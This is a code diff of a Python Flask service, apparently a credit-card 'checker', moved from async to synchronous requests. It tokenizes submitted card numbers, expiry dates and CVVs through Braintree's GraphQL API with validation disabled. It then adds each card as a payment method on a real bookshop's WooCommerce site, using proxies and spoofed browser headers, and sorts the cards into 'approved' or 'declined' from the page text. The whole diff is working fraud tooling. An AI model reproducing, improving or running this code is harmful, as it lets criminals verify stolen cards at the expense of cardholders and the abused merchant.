+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Content-Type': 'application/json',
+            'Authorization': f'Bearer {auth}',
+            'Braintree-Version': '2018-05-10',
+            'Origin': 'https://assets.braintreegateway.com',
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Sec-Fetch-Site': 'cross-site',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'Referer': 'https://assets.braintreegateway.com/',
+        }
+        
+        graphql_payload = {
+            'clientSdkMetadata': {
+                'source': 'client',
+                'integration': 'custom',
+                'sessionId': braintree_session_id,
+            },
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
+            'variables': {
+                'input': {
+                    'creditCard': {
+                        'number': cc,
+                        'expirationMonth': mm,
+                        'expirationYear': yy,
+                        'cvv': cvv,
                     },
-                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
-                    'variables': {
-                        'input': {
-                            'creditCard': {
-                                'number': cc,
-                                'expirationMonth': mm,
-                                'expirationYear': yy,
-                                'cvv': cvv,
-                            },
-                            'options': {'validate': False},
-                        },
-                    },
-                    'operationName': 'TokenizeCreditCard',
-                }
-                
-                async with session.post('https://payments.braintree-api.com/graphql', json=graphql_payload, headers=headers9) as response:
-                    result = await response.json()
-                
-                if 'errors' in result:
-                    return {'status': 'error', 'message': f'Tokenization error: {result.get("errors")}'}
-                
-                card_token = result['data']['tokenizeCreditCard']['token']
-                
-                headers10 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Cache-Control': 'max-age=0',
-                    'Origin': 'https://www.windhorsepublications.com',
-                    'Referer': 'https://www.windhorsepublications.com/my-account/add-payment-method/',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Upgrade-Insecure-Requests': '1',
-                }
-                
-                payment_data = f'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled&wc-braintree-credit-card-3d-secure-verified&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={card_token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%22{device_correlation_id}%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={payment_nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
-                
-                async with session.post('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers10, data=payment_data, proxy=proxy_url) as response:
-                    html = await response.text()
-                
-                if 'Nice!' in html or 'Avs' in html or 'avs' in html or 'successfully' in html.lower():
-                    return {
-                        'status': 'approved',
-                        'message': 'Auth Successfully',
-                        'card': cc,
-                        'bin': cc[:6],
-                        'last4': cc[-4:],
-                        'email': email,
-                        'username': username
-                    }
-                else:
-                    error_message = 'Card declined'
-                    soup = BeautifulSoup(html, 'html.parser')
-                    error_div = soup.find('div', class_='woocommerce-notices-wrapper')
-                    if error_div:
-                        error_msgs = error_div.find_all('li')
-                        if error_msgs:
-                            error_message = error_msgs[0].get_text(strip=True)
-                    return {
-                        'status': 'declined',
-                        'message': error_message,
-                        'card': cc
-                    }
+                    'options': {'validate': False},
+                },
+            },
+            'operationName': 'TokenizeCreditCard',
+        }
         
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        result = loop.run_until_complete(process_card())
-        loop.close()
+        response = requests.post('https://payments.braintree-api.com/graphql', json=graphql_payload, headers=headers9, timeout=30)
+        result = response.json()
         
-        return jsonify(result), 200
+        if 'errors' in result:
+            return jsonify({'status': 'error', 'message': f'Tokenization error: {result.get("errors")}'}), 200
+        
+        card_token = result['data']['tokenizeCreditCard']['token']
+        
+        headers10 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Cache-Control': 'max-age=0',
+            'Origin': 'https://www.windhorsepublications.com',
+            'Referer': 'https://www.windhorsepublications.com/my-account/add-payment-method/',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        
+        payment_data = f'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled&wc-braintree-credit-card-3d-secure-verified&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={card_token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%22{device_correlation_id}%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={payment_nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
+        
+        response = session.post('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers10, data=payment_data, proxies=proxy_dict, timeout=30)
+        html = response.text
+        
+        if 'Nice!' in html or 'Avs' in html or 'avs' in html or 'successfully' in html.lower():
+            return jsonify({
+                'status': 'approved',
+                'message': 'Auth Successfully',
+                'card': cc,
+                'bin': cc[:6],
+                'last4': cc[-4:],
+                'email': email,
+                'username': username
+            }), 200
+        else:
+            error_message = 'Card declined'
+            soup = BeautifulSoup(html, 'html.parser')
+            error_div = soup.find('div', class_='woocommerce-notices-wrapper')
+            if error_div:
+                error_msgs = error_div.find_all('li')
+                if error_msgs:
+                    error_message = error_msgs[0].get_text(strip=True)
+            return jsonify({
+                'status': 'declined',
+                'message': error_message,
+                'card': cc
+            }), 200
         
     except Exception as e:
         return jsonify({
             'status': 'error',
             'message': str(e)
         }), 500
+    finally:
+        session.close()
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
